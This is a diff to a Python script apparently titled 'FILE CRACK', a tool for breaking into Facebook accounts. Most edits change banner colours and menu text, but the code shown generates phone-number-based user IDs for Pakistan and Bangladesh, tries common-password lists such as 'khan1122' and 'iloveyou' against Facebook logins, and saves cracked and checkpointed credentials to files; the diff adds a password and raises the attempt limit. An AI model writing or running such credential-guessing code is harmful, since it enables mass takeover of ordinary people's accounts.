@@ -51,13 +51,13 @@ logo=("""
 \033[1;37m   ██     ██████  ██   ████\033[1;32m ██      ██  ██████     ██    
                                              
 \033[1;37m ══════════════════════════════════════════════════
-\033[1;37mAUTHOR  : \033[1;32mTONMOY MAHATO                                                          
-\033[1;37mGITHUB  : \033[1;32mtonmoy404-cyber                                                             
-\033[1;37mYOU TUBE  : \033[1;32mTONMOY MAHATO                                                          
-\033[1;37mTOOL  : \033[1;32mFILE CRACK                                                                        
+\033[1;37m AUTHOR  : \033[1;32mTONMOY MAHATO                                                          
+\033[1;37m GITHUB  : \033[1;32mtonmoy404-cyber                                                             
+\033[1;37m YOU TUBE  : \033[1;32mTONMOY MAHATO                                                          
+\033[1;37m TOOL  : \033[1;32mFILE CRACK                                                                        
 \033[1;37m ══════════════════════════════════════════════════\033[1;37m""")
 def linex():
-	print('\033[1;37m══════════════════════════════════════════════════')
+	print('\033[1;37m ══════════════════════════════════════════════════')
 def clear():
         os.system('clear')
         print(logo)
@@ -135,7 +135,7 @@ def menu():
                                 os.system('python Tonmoy.py')
                         elif xd in ['2','02']:
                                 clear()
-                                print(' [1] Pakistan cloning\n [2] Bangladesh cloningn [0] Back menu')
+                                print(' \033[1;32m[1] Pakistan\033[1;37m cloning\n \033[1;32m[2] Bangla\033[1;37mdesh \n [0] \033[1;32mBa\033[1;37mck')
                                 linex()
                                 x=input(' Choose: ')
                                 if x in ['1','01']:
@@ -190,14 +190,14 @@ def pak():
                         clear()
                         tl = str(len(user))
                         print(' Total account : \033[1;32m'+tl)
-                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
-                        print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
+                        print(f'\033[1;32m Choice\033[1;37m code ..:\033[1;32m '+code)
+                        print(f'\033[1;32m \x1b[38;5;208mUse flight mo\033[1;37mde for speed up\033[1;97m')
                         linex()
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
                                 Tonmoy.submit(rndm,ids,passlist)
-                print('\033[1;37m')
+                print('\033[1;30m')
                 linex()
                 print(' The process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
@@ -207,10 +207,10 @@ def pak():
 def bd():
                 user=[]
                 clear()
-                print('\033[1;31m Code example: 016,017,018,019')
+                print('\033[1;31m Code example: \033[1;31m016,\033[1;31m(\033[1;32mbest017\033[1;31m),\033[1;31m018,\033[1;31m019,\033[1;31m014,\033[1;31m013,')
                 code = input('\033[1;37m put code: ')
                 try:
-                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
+                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000,50000\n\033[1;37m put limit: '))
                 except ValueError:
                         limit = 5000
                 for nmbr in range(limit):
@@ -225,9 +225,9 @@ def bd():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
+                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire,fflover']
                                 Tonmoy.submit(rndm,ids,passlist)
-                print('\033[1;37m')
+                print('\033[1;30m')
                 linex()
                 print(' The process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
@@ -236,7 +236,7 @@ def bd():
                 os.system('python Tonmoy.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [TONMOY] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;30m [TONMOY] %s|\033[1;32mOK:-%s \033[1;30m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -263,7 +263,7 @@ def ffb(ids,names,passlist):
                                 break
                         elif 'checkpoint' in Tonmoy:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [TONMOY-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\\033[1;32m [TONMOY-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/TONMOY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -334,7 +334,7 @@ def api(ids,names,passlist):
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [TONMOY-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\\033[1;32m [TONMOY-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/TONMOY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
